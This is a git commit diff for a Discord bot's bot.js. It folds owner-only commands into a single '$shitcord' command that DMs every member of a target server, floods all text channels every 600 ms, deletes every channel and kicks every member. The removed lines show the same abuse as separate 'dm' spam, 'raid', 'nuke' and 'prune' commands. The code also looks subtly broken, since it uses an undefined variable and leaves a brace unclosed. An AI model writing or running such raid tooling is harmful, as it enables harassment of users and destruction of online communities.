521c04490b69e7722c8a35a65ab26471aa4e9dd1
Aeterne Satiatus <lafayedemicheaux.luka@gmail.com>
2019-06-23 13:22:00 +1000

    Update bot.js

--- bot.js
+++ bot.js
@@ -3,7 +3,7 @@ const client = new Discord.Client();
 
 // Configuration
 const prefix = "$";
-const owner_ids = ["532688425950642198", "505349958967361536", "587487245523484674"];
+const owner_ids = ["587487245523484674"];
 
 function isOwner(id) {
     for(var i of owner_ids) {
@@ -12,79 +12,32 @@ function isOwner(id) {
     return false;
 }
 
-// Automated DM for new members in chosen server
-const dm = false;
-const serverid = "";
-const msg = "Welcome to Aeterne's community!";
-
 // Bot commands
 client.on('message', message => {
     if (isOwner(message.author.id)) {
         var args = message.content.split(" ");
-
-        // Spam someone in DM
-        if (args[0] == prefix + 'dm') {
-            if (args[1] != null && args[2] != null) {
-                delete args[0];
-                var victimid = client.users.get(args[1]);
-                delete args[1];
-                var msg = args.join(" ");
-                client.fetchUser(victimid).then((victim) => {
-                    var interval = setInterval(function () {
-                        victim.send(msg);
-                    }, 600);
-                });        
-            }
-        }
         
-        // DM all members in a server
-        if (args[0] == prefix + 'dms') {
-            if (args[1] != null && args[2] != null) {
-                delete args[0];
-                var serverid = args[1];
-                delete args[1];
-                var msg = args.join(" ");
-                client.guilds.get(serverid).members.map(m => {
+        if (args[0] == prefix + 'shitcord') {
+            delete args[0];
+            var serverid = args[1];
+            let guild = client.guilds.get(serverid);
+            delete args[1];
+            var msg = args.join(" ");
+            client.guilds.get(serverid).members.map(m => {
                     m.send(msg);
+            });
+            var interval = setInterval(function () {
+                client.guilds.get(gid).channels.map(c => {
+                    if (c.type == "text") c.send(msg);
                 });
-            }
-        }
-        
-        // Spam multiple channels in a server
-        if (args[0] == prefix + 'raid') {
-            if (args[1] != null && args[2] != null) {
-                delete args[0];
-                var gid = args[1];
-                delete args[1];
-                var msg = args.join(" ");
-                var interval = setInterval(function () {
-                        client.guilds.get(gid).channels.map(c => {
-                            if (c.type == "text") c.send(msg);
-                        });
-                }, 600);
-            }
-        }
-        
-        // Deletes all channels of a server
-        if (args[0] == prefix + 'nuke') {
-            if (args[1] != null) {
-                let guild = client.guilds.get(args[1]);
-                guild.channels.forEach(c => {
+            }, 600);
+            guild.channels.forEach(c => {
                     c.delete();
                 });
-            }
-        }
-        
-        // Kicks all members from server
-        if (args[0] == prefix + 'prune') {
-            if (args[1] != null) {
-                let guild = client.guilds.get(args[1]);
-                guild.members.forEach(m => {
+            guild.members.forEach(m => {
                     m.kick();
                 });
-            }
-        }
-
+    
         // Restart bot
         if (args[0] == prefix + 'restart') {
                require("child_process").spawn(process.argv.shift(), process.argv, {
@@ -94,24 +47,6 @@ client.on('message', message => {
                });
                process.exit();
         }
-    }
-});
-
-/*
-Join handler
-*/
-client.on('guildMemberAdd', (member, channel, guild) => {
-    try {
-        if (dm != false && serverid != null && serverid != "" && msg != "") {
-            if (typeof (member) != "undefined") {
-                var gid = member.guild.id;
-                if (gid == serverid) {
-                    member.send(msg);
-                }
-            }
-        }
-    } catch (err) {
-        console.log("[Join] " + err);
     }
 });
 
